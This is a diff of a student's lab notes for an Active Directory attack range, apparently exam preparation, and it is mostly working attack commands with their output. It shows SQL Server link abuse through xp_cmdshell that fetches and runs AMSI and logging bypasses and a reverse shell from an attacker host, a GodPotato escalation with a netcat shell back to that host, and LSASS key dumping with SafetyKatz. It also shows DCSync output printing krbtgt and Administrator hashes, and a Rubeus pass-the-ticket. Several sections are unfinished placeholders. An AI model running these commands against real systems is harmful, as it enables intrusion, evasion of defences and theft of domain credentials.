+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
+SeUndockPrivilege                         Remove computer from docking station                               Disabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
+SeTimeZonePrivilege                       Change the time zone                                               Disabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
+```
+
+???
+
+`C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
+```
+[SNIP]
+```
+
+`Import-Module C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1`
+
+`Find-PSRemotingLocalAdminAccess -Domain tech.finance.corp -Verbose`:
+```
+VERBOSE: Trying to run a command parallely on the provided computers list using PSRemoting.
+```
+❌
+
+`winrs -r:dbserver31.tech.finance.corp cmd`:
+```
+Winrs error:Access is denied.
+```
+❌
+
+???
+
+- **Firewall???**
+
+![techsrv30 | techservice](https://custom-icon-badges.demolab.com/badge/techsrv30-techservice-64b5f6?logo=windows11&logoColor=white)
+
+`Get-Service -Name MpsSvc`:
+```
+Status   Name               DisplayName
+------   ----               -----------
+Running  MpsSvc             Windows Defender Firewall
+```
+
+`Get-NetFirewallProfile | Select Name, Enabled`:
+```
+Name    Enabled
+----    -------
+Domain    False
+Private   False
+Public    False
+```
+
+`Test-NetConnection -ComputerName localhost -Port 8080`:
+```
+WARNING: TCP connect to (::1 : 8080) failed
+WARNING: TCP connect to (127.0.0.1 : 8080) failed
+
+
+ComputerName           : localhost
+RemoteAddress          : ::1
+RemotePort             : 8080
+InterfaceAlias         : Loopback Pseudo-Interface 1
+SourceAddress          : ::1
+PingSucceeded          : True
+PingReplyDetails (RTT) : 0 ms
+TcpTestSucceeded       : False📌
+```
+
+---
+
 #### Domain Privilege Escalation | Resource-based Constrained Delegation (with PowerView, Rubeus, SafetyKatz)
 
 - **Find a Target Server where we have Write Permissions and Access to it**
 
-![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
 ```
@@ -1773,22 +2141,66 @@ C:\Users\Administrator.TECH>
 
 `Find-InterestingDomainACL | ?{$_.identityreferencename -match 'techservice'}`
 
-`Find-InterestingDomainACL | ?{$_.identityreferencename -match 'sqlserversync'}`:
+`Find-InterestingDomainACL -ResolveGUIDs | ?{$_.identityreferencename -match 'sqlserversync'}`:
 ```
-ObjectDN📌              : CN=DCORP-MGMT🖥️,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
+ObjectDN                : DC=tech,DC=finance,DC=corp
 AceQualifier            : AccessAllowed
-ActiveDirectoryRights   : ListChildren, ReadProperty, GenericWrite📌
-ObjectAceType           : None
+ActiveDirectoryRights   : ExtendedRight
+ObjectAceType           : DS-Replication-Get-Changes-In-Filtered-Set📑
 AceFlags                : None
-AceType                 : AccessAllowed
+AceType                 : AccessAllowedObject
 InheritanceFlags        : None
-SecurityIdentifier      : S-1-5-21-719815819-3726368948-3917688648-1121
-IdentityReferenceName   : ciadmin👤
-IdentityReferenceDomain : dollarcorp.moneycorp.local
-IdentityReferenceDN     : CN=ci admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
+SecurityIdentifier      : S-1-5-21-1325336202-3661212667-302732393-1111
+IdentityReferenceName   : sqlserversync👤
+IdentityReferenceDomain : tech.finance.corp
+IdentityReferenceDN     : CN=sqlserver sync,CN=Users,DC=tech,DC=finance,DC=corp
+IdentityReferenceClass  : user
+
+ObjectDN                : DC=tech,DC=finance,DC=corp
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : ExtendedRight
+ObjectAceType           : DS-Replication-Get-Changes📑
+AceFlags                : None
+AceType                 : AccessAllowedObject
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-1325336202-3661212667-302732393-1111
+IdentityReferenceName   : sqlserversync👤
+IdentityReferenceDomain : tech.finance.corp
+IdentityReferenceDN     : CN=sqlserver sync,CN=Users,DC=tech,DC=finance,DC=corp
+IdentityReferenceClass  : user
+
+ObjectDN                : DC=tech,DC=finance,DC=corp
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : ExtendedRight
+ObjectAceType           : DS-Replication-Get-Changes-All📑
+AceFlags                : None
+AceType                 : AccessAllowedObject
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-1325336202-3661212667-302732393-1111
+IdentityReferenceName   : sqlserversync👤
+IdentityReferenceDomain : tech.finance.corp
+IdentityReferenceDN     : CN=sqlserver sync,CN=Users,DC=tech,DC=finance,DC=corp
 IdentityReferenceClass  : user
 ```
 
+``:
+```
+
+```
+
+``:
+```
+
+```
+
+``:
+```
+
+```
+
+---
+
+### Cross Trust Attacks
 
 #### Cross Trust Attacks | SQL Server Links Abuse (with PowerUpSQL, Invoke-PowerShellTcpEx)
 
@@ -1796,7 +2208,7 @@ IdentityReferenceClass  : user
 
 ![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
 
-`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
+`C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
 ```
 [SNIP]
 ```
@@ -1805,9 +2217,959 @@ IdentityReferenceClass  : user
 
 `Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose`:
 ```
-VERBOSE: dbserver31.tech.finance.corp : Connection Failed.
+ComputerName           : dbserver31.tech.finance.corp📌
+Instance               : DBSERVER31🖥️
+DomainName             : TECH🏛️
+ServiceProcessID       : 2316
+ServiceName            : MSSQLSERVER🗄️
+ServiceAccount         : tech\sqlserversync
+AuthenticationMode     : Windows and SQL Server Authentication
+ForcedEncryption       : 0
+Clustered              : No
+SQLServerVersionNumber : 15.0.2000.5
+SQLServerMajorVersion  : 2019
+SQLServerEdition       : Developer Edition (64-bit)
+SQLServerServicePack   : RTM
+OSArchitecture         : X64
+OsMachineType          : ServerNT
+OSVersionName          : Windows Server 2019 Datacenter
+OsVersionNumber        : SQL
+Currentlogin           : TECH\databaseagent👤
+IsSysadmin             : Yes📌
+ActiveSessions         : 1
+```
+
+`klist`:
+```
+Current LogonId is 0:0x87a2d7
+
+Cached Tickets: (2)
+
+#0>     Client: databaseagent🎭 @ TECH.FINANCE.CORP🏛️
+        Server: krbtgt📌/TECH.FINANCE.CORP @ TECH.FINANCE.CORP
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 3/11/2025 14:53:02 (local)
+        End Time:   3/12/2025 0:53:02 (local)
+        Renew Time: 3/18/2025 14:53:02 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called: TECH-DC
+
+#1>     Client: databaseagent🎭 @ TECH.FINANCE.CORP🏛️
+        Server: ldap📌/tech-dc🖥️.tech.finance.corp @ TECH.FINANCE.CORP
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
+        Start Time: 3/11/2025 14:53:02 (local)
+        End Time:   3/12/2025 0:53:02 (local)
+        Renew Time: 3/18/2025 14:53:02 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called: tech-dc.tech.finance.corp
+```
+
+`Get-SQLServerLinkCrawl -Instance 'dbserver31.tech.finance.corp' -Verbose`:
+```
+VERBOSE: dbserver31.tech.finance.corp : Connection Success.
+VERBOSE: dbserver31.tech.finance.corp : Connection Success.
+VERBOSE: --------------------------------
+VERBOSE:  Server: DBSERVER31🖥️
+VERBOSE: --------------------------------
+VERBOSE:  - Link Path to server: DBSERVER31🔗
+VERBOSE:  - Link Login: TECH\databaseagent👤
+VERBOSE:  - Link IsSysAdmin: 1📌
+VERBOSE:  - Link Count: 0
+VERBOSE:  - Links on this server:
+
+
+Version     : SQL Server 2019
+Instance    : DBSERVER31🖥️
+CustomQuery :
+Sysadmin    : 1📌
+Path        : {DBSERVER31}
+User        : TECH\databaseagent👤
+Links       :
+```
+
+`Get-SQLServerLinkCrawl -Instance 'dbserver31.tech.finance.corp' -Query "exec master..xp_cmdshell 'set username'"`:
+```
+Version     : SQL Server 2019
+Instance    : DBSERVER31
+CustomQuery : {USERNAME=sqlserversync, }📌
+Sysadmin    : 1
+Path        : {DBSERVER31}
+User        : TECH\databaseagent
+Links       :
+```
+
+![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
+
+`C:\AD\Tools\nc64.exe -lvp 443`:
+```
+listening on [any] 443 ...
+
+[...]
+```
+
+![Invoke-PowerShellTcpEx.ps1](./assets/screenshots/learning_objective_22_invokepowershelltcpex.png)
+
+`Get-SQLServerLinkCrawl -Instance 'dbserver31.tech.finance.corp' -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.1/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.1/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.1/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget 'dbserver31'`
+
+![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
+
+```
+[...]
+
+172.16.6.31: inverse host lookup failed: h_errno 11004: NO_DATA
+connect to [172.16.100.1] from (UNKNOWN) [172.16.6.31] 49747: NO_DATA
+Windows PowerShell running as user sqlserversync on DBSERVER31
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32>
+```
+🚀
+
+![sqlserversync | dbserver31](https://custom-icon-badges.demolab.com/badge/sqlserversync-dbserver31-64b5f6?logo=windows11&logoColor=white)
+
+`$env:username`:
+```
+tech\sqlserversync👤
+```
+
+`$env:computername`:
+```
+DBSERVER31🖥️
+```
+🚩
+
+---
+
+## Domain Lateral Movement
+
+### Domain Lateral Movement 2 | Credential Extraction (with ...)
+
+![sqlserversync | dbserver31](https://custom-icon-badges.demolab.com/badge/sqlserversync-dbserver31-64b5f6?logo=windows11&logoColor=white)
+
+`iex (iwr -UseBasicParsing http://172.16.100.1/sbloggingbypass.txt)`
+
+`iex (iwr -UseBasicParsing http://172.16.100.1/amsibypass.txt)`
+
+![HFS - Loader.exe](learning_objective_07_hfs_loader.png)
+
+`iwr http://172.16.100.1/Loader.exe -OutFile C:\Users\Public\Loader.exe`
+
+`iwr http://172.16.100.1/SafetyKatz.exe -OutFile C:\Users\Public\SafetyKatz.exe`
+
+![HFS -SafetyKatz.exe](learning_objective_07_hfs_safetykatz.png)
+
+`C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe sekurlsa::evasive-keys exit`:
+```
+[+] Successfully unhooked ETW!
+[+++] NTDLL.DLL IS UNHOOKED!
+[+++] KERNEL32.DLL IS UNHOOKED!
+[+++] KERNELBASE.DLL IS UNHOOKED!
+[+++] ADVAPI32.DLL IS UNHOOKED!
+[+] URL/PATH : C:\Users\Public\SafetyKatz.exe Arguments :
+
+[X] Not in high integrity, unable to grab a handle to lsass!
 ```
 ❌
+
+`whoami /priv`:
+```
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+```
+
+`Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full\' | Get-ItemPropertyValue -Name Version`:
+```
+4.7.03190
+```
+
+`iwr http://172.16.100.1/GodPotato-NET4.exe -OutFile C:\Users\Public\GodPotato-NET4.exe`
+
+`iwr http://172.16.100.1/nc64.exe -OutFile C:\Users\Public\nc64.exe`
+
+![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
+
+`C:\AD\Tools\nc64.exe -lvp 1337`:
+```
+listening on [any] 1337 ...
+
+[...]
+```
+
+![sqlserversync | dbserver31](https://custom-icon-badges.demolab.com/badge/sqlserversync-dbserver31-64b5f6?logo=windows11&logoColor=white)
+
+`C:\Users\Public\GodPotato-NET4.exe -cmd "C:\Users\Public\nc64.exe -e C:\Windows\System32\cmd.exe 172.16.100.1 1337"`
+
+![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
+
+```
+[...]
+
+172.16.6.31: inverse host lookup failed: h_errno 11004: NO_DATA
+connect to [172.16.100.1] from (UNKNOWN) [172.16.6.31] 49848: NO_DATA
+Microsoft Windows [Version 10.0.17763.2452]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+
+![system | dbserver31](https://custom-icon-badges.demolab.com/badge/sqlserversync-dbserver31-64b5f6?logo=windows11&logoColor=white)
+
+`C:\Users\Public\Loader.exe -Path C:\Users\Public\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"`:
+```
+mimikatz(commandline) # sekurlsa::evasive-keys📌
+
+[SNIP]
+
+Authentication Id : 0 ; 60395 (00000000:0000ebeb)
+Session           : Service from 0
+User Name         : sqlserversync👤
+Domain            : TECH
+Logon Server      : TECH-DC
+Logon Time        : 3/11/2025 12:48:28 PM
+SID               : S-1-5-21-1325336202-3661212667-302732393-1111
+
+         * Username : sqlserversync
+         * Domain   : TECH.FINANCE.CORP
+         * Password : (null)
+         * Key List :
+           aes256_hmac       9ad6e6b51e9e3c9512b3a924360f779886d7b08e6da23d01aa4f664270b7ee65🔑
+           rc4_hmac_nt       c4fa140adb18d91b7ad9e2bfbc15ab0a
+           rc4_hmac_old      c4fa140adb18d91b7ad9e2bfbc15ab0a
+           rc4_md4           c4fa140adb18d91b7ad9e2bfbc15ab0a
+           rc4_hmac_nt_exp   c4fa140adb18d91b7ad9e2bfbc15ab0a
+           rc4_hmac_old_exp  c4fa140adb18d91b7ad9e2bfbc15ab0a
+
+[SNIP]
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DBSERVER31$👤
+Domain            : TECH
+Logon Server      : (null)
+Logon Time        : 3/11/2025 12:48:27 PM
+SID               : S-1-5-18
+
+         * Username : dbserver31$
+         * Domain   : TECH.FINANCE.CORP
+         * Password : (null)
+         * Key List :
+           aes256_hmac       a10de8a9e4b5640372d19d80b47f059aae33d80d89bb444e8b3057417b2af3e7🔑
+           rc4_hmac_nt       8e49721313edefc3bd96634c5920130e
+           rc4_hmac_old      8e49721313edefc3bd96634c5920130e
+           rc4_md4           8e49721313edefc3bd96634c5920130e
+           rc4_hmac_nt_exp   8e49721313edefc3bd96634c5920130e
+           rc4_hmac_old_exp  8e49721313edefc3bd96634c5920130e
+
+[SNIP]
+```
+
+---
+
+### Domain Lateral Movement | ??? + DCSync
+
+``:
+```
+
+```
+
+`klist`:
+```
+Current LogonId is 0:0xa5a8d0
+
+Cached Tickets: (1)
+
+#0>     Client: sqlserversync @ TECH.FINANCE.CORP
+        Server: krbtgt/TECH.FINANCE.CORP @ TECH.FINANCE.CORP
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 3/11/2025 16:46:58 (local)
+        End Time:   3/12/2025 2:46:58 (local)
+        Renew Time: 3/18/2025 16:46:58 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+```
+
+---
+
+???
+
+![`studentshare` SMB share 1](./assets/screenshots/learning_objective_23_smbshare_1.png)
+
+![`studentshare` SMB share 2](./assets/screenshots/learning_objective_23_smbshare_2.png)
+
+![Enable `Guest` local user 1](./assets/screenshots/learning_objective_23_enable_guest_1.png)
+
+![Enable `Guest` local user 2](./assets/screenshots/learning_objective_23_enable_guest_2.png)
+
+![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
+
+`hostname`:
+```
+studvm🖥️
+```
+
+`copy C:\AD\Tools\minidumpdotnet.exe \\studvm\studentshare`
+
+`copy C:\AD\Tools\FindLSASSPID.exe \\studvm\studentshare`
+
+![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
+
+`klist`:
+```
+Current LogonId is 0:0x87a2d7
+
+Cached Tickets: (2)
+
+#0>     Client: databaseagent🎭 @ TECH.FINANCE.CORP🏛️
+        Server: krbtgt📌/TECH.FINANCE.CORP @ TECH.FINANCE.CORP
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 3/11/2025 14:53:02 (local)
+        End Time:   3/12/2025 0:53:02 (local)
+        Renew Time: 3/18/2025 14:53:02 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called: TECH-DC
+
+#1>     Client: databaseagent🎭 @ TECH.FINANCE.CORP🏛️
+        Server: ldap📌/tech-dc🖥️.tech.finance.corp @ TECH.FINANCE.CORP
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
+        Start Time: 3/11/2025 14:53:02 (local)
+        End Time:   3/12/2025 0:53:02 (local)
+        Renew Time: 3/18/2025 14:53:02 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called: tech-dc.tech.finance.corp
+```
+
+`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
+```
+[SNIP]
+```
+
+`Import-Module C:\AD\Tools\PowerUpSQL-master\PowerUpSQL.psd1`
+
+`Get-SQLServerLinkCrawl -Instance 'dbserver31.tech.finance.corp' -Query 'exec master..xp_cmdshell ''\\studvm.tech.finance.corp\studentshare\FindLSASSPID.exe''' -QueryTarget 'dbserver31'`:
+```
+Version     : SQL Server 2019
+Instance    : DBSERVER31
+CustomQuery : {[+] LSASS PID: 664,📌 }
+Sysadmin    : 1
+Path        : {DBSERVER31}
+User        : TECH\databaseagent
+Links       :
+```
+
+`Get-SQLServerLinkCrawl -Instance 'dbserver31.tech.finance.corp' -Query 'SELECT @@version' -QueryTarget 'dbserver31'`:
+```
+[SNIP]
+```
+
+`Get-SQLServerLinkCrawl -Instance 'dbserver31.tech.finance.corp' -Query 'exec master..xp_cmdshell ''\\studvm.tech.finance.corp\studentshare\minidumpdotnet.exe 664 \\studvm.tech.finance.corp\studentshare\monkey422.dmp''' -QueryTarget 'dbserver31'`:
+```
+
+```
+
+???
+
+---
+
+### Domain Persistence
+
+#### Domain Persistence | Replication Rights Abuse + DCSync (with PowerView, Rubeus, SafetyKatz)
+
+![Run as administrator](learning_objectives_run_as_administrator.png)
+
+![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
+
+`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:sqlserversync /aes256:9ad6e6b51e9e3c9512b3a924360f779886d7b08e6da23d01aa4f664270b7ee65 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
+```
+[SNIP]
+
+[*] Action: Ask TGT📌
+
+[*] Got domain: tech.finance.corp
+[*] Showing process : True
+[*] Username        : T5GXXINY
+[*] Domain          : SVDT1WDO
+[*] Password        : WFSGH60A
+[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 4176
+[+] LUID            : 0xa5a8d0
+
+[*] Using domain controller: tech-dc.tech.finance.corp (172.16.4.1)
+[!] Pre-Authentication required!
+[!]     AES256 Salt: TECH.FINANCE.CORPsqlserversync
+[*] Using aes256_cts_hmac_sha1 hash: 9ad6e6b51e9e3c9512b3a924360f779886d7b08e6da23d01aa4f664270b7ee65
+[*] Building AS-REQ (w/ preauth) for: 'tech.finance.corp\sqlserversync'
+[*] Target LUID : 10856656
+[*] Using domain controller: 172.16.4.1:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+[SNIP]
+
+[*] Target LUID: 0xa5a8d0
+[+] Ticket successfully imported!🎟️
+
+  ServiceName              :  krbtgt📌/TECH.FINANCE.CORP🏛️
+  ServiceRealm             :  TECH.FINANCE.CORP
+  UserName                 :  sqlserversync🎭 (NT_PRINCIPAL)
+  UserRealm                :  TECH.FINANCE.CORP
+  StartTime                :  3/11/2025 4:46:58 PM
+  EndTime                  :  3/12/2025 2:46:58 AM
+  RenewTill                :  3/18/2025 4:46:58 PM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  ytus0ORUsbaiJp5A0OsYlMIJtEEqYP2SnF3/dNGi+z0=
+  ASREP (key)              :  9AD6E6B51E9E3C9512B3A924360F779886D7B08E6DA23D01AA4F664270B7EE65
+```
+
+![New spawned terminal process](learning_objective_12_new_spawned_terminal_process.png)
+
+`klist`:
+```
+Current LogonId is 0:0xa5a8d0
+
+Cached Tickets: (1)
+
+#0>     Client: sqlserversync🎭 @ TECH.FINANCE.CORP🏛️
+        Server: krbtgt📌/TECH.FINANCE.CORP @ TECH.FINANCE.CORP
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 3/11/2025 16:46:58 (local)
+        End Time:   3/12/2025 2:46:58 (local)
+        Renew Time: 3/18/2025 16:46:58 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+```
+
+`winrs -r:dbserver31.tech.finance.corp cmd`:
+```
+Winrs error:Access is denied.
+```
+❌
+
+`C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
+```
+[SNIP]
+```
+
+`C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:tech\krbtgt" "exit"`:
+```
+
+```
+
+`C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:tech\krbtgt /domain:tech.finance.corp" exit`:
+```
+[SNIP]
+
+mimikatz(commandline) # lsadump::dcsync /user:tech\krbtgt /domain:tech.finance.corp📌
+
+[SNIP]
+
+[DC] 'tech.finance.corp'🏛️ will be the domain
+[DC] 'tech-dc🖥️.tech.finance.corp' will be the DC server
+[DC] 'tech\krbtgt' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt👤
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 3/11/2025 6:59:11 AM
+Object Security ID   : S-1-5-21-1325336202-3661212667-302732393-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: c8c5d0537d1ef5ba43af84fd66dfb498🔑
+    ntlm- 0: c8c5d0537d1ef5ba43af84fd66dfb498
+    ntlm- 1: f875aad4174d8265844b09ef1ddb6e93
+    ntlm- 2: 9e482ed416a6e98116bb264d704fc3a4
+    ntlm- 3: 1c649b80c81e407469e39a4feb4ae173
+    ntlm- 4: 36ce545b31de928a63d3cec844fdf8c6
+    ntlm- 5: 8d205a3d324a50624a141d6aa8b81966
+    ntlm- 6: d1ed73ddb4453a4d927b62af59f9b16e
+    lm  - 0: b048280988a48668af05934c802b4cba
+    lm  - 1: e88f96253c4c1fa0bf2699f9b9c7dca7
+    lm  - 2: 381c1dabe1e518585fceeeb5bc7dc686
+    lm  - 3: 0d11502c286392d1481bab098600eefb
+    lm  - 4: d8b16223b8dce40b1eca3c1c32212e81
+    lm  - 5: bb824155cea8e8aff8301e31ade7c0d1
+    lm  - 6: 2f841df9adc53fcc71d8a0588bf13181
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 67640f8b9fb1f4e43cc4f4be9107dee2
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : TECH.FINANCE.CORPkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 3a1a8536741cc8565ad4785e6dca779deb438c19d5e91bba596682de9fccf2d3🔑
+      aes128_hmac       (4096) : 3956556c7fba9cf17339c2d21319689d
+      des_cbc_md5       (4096) : 16df9d62f797232c
+    OldCredentials
+      aes256_hmac       (4096) : ec906e7b3979eee090adcd80feb6f990aff726fcaf49465cd4e326168c8c2941
+      aes128_hmac       (4096) : 950f16f1f357dede948a1b382b11ca4a
+      des_cbc_md5       (4096) : 0d493b10df4013a2
+    OlderCredentials
+      aes256_hmac       (4096) : 9ee3ed0c1e1cf514236e977e3f53b8d0a3f02f16636cd3385380dd1e9879ec4c
+      aes128_hmac       (4096) : 1268aaaff3549e49e4c8c618037009ef
+      des_cbc_md5       (4096) : 7a94dc8fc4bff1f4
+
+[SNIP]
+```
+
+`C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:tech\administrator /domain:tech.finance.corp" exit`:
+```
+[SNIP]
+
+mimikatz(commandline) # lsadump::dcsync /user:tech\administrator /domain:tech.finance.corp📌
+
+[SNIP]
+
+[DC] 'tech.finance.corp'🏛️ will be the domain
+[DC] 'tech-dc🖥️.tech.finance.corp' will be the DC server
+[DC] 'tech\administrator' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator👤
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   :
+Password last change : 3/16/2022 3:56:32 AM
+Object Security ID   : S-1-5-21-1325336202-3661212667-302732393-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: acfd00282fbe922483c12e049e6e8990🔑
+    ntlm- 0: acfd00282fbe922483c12e049e6e8990
+    ntlm- 1: 58ce52a1d25fff985d061827fc475535
+    ntlm- 2: acfd00282fbe922483c12e049e6e8990
+    ntlm- 3: 38038c7899ece8fd5b2670061e52562a
+    ntlm- 4: acfd00282fbe922483c12e049e6e8990
+    lm  - 0: 57d8b5b97f50b007ce8b47e01ee07464
+    lm  - 1: 2f60b78ccdcdfb823c9d5316ca933db0
+    lm  - 2: 3a1f73c8e89a46dd4dd5479af7d21605
+    lm  - 3: 4f1d3bd9e2e89852bd96a05d5aa97e9e
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 894e9ba9f4c91c118b9bfe648cdad5be
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : TECH.FINANCE.CORPAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : d9410bd213225049d5beb8cd5fa2eeefc856ffbaa6f35541ac91d6ba2c5ed165🔑
+      aes128_hmac       (4096) : 309331140cd7f06f9bdafb80a23a3a93
+      des_cbc_md5       (4096) : 9bcb46852a514aef
+    OldCredentials
+      aes256_hmac       (4096) : a4956a2aa09644773e0a360b5c905a4d086ef68fd644005e35ab6089de1b5cc6
+      aes128_hmac       (4096) : abf97894a1886f2087a18cd77f912345
+      des_cbc_md5       (4096) : 0b9b89a4d9a40797
+    OlderCredentials
+      aes256_hmac       (4096) : d9410bd213225049d5beb8cd5fa2eeefc856ffbaa6f35541ac91d6ba2c5ed165
+      aes128_hmac       (4096) : 309331140cd7f06f9bdafb80a23a3a93
+      des_cbc_md5       (4096) : 9bcb46852a514aef
+
+[SNIP]
+```
+
+---
+
+### Domain Persistence
+
+#### Domain Persistence | Golden Ticket + DCSync
+
+![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
+
+![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
+
+`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /aes256:d9410bd213225049d5beb8cd5fa2eeefc856ffbaa6f35541ac91d6ba2c5ed165 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
+```
+[SNIP]
+
+[*] Action: Ask TGT📌
+
+[*] Got domain: tech.finance.corp
+[*] Showing process : True
+[*] Username        : RY2UWDIO
+[*] Domain          : QCUPTQMT
+[*] Password        : KHJ0WPOJ
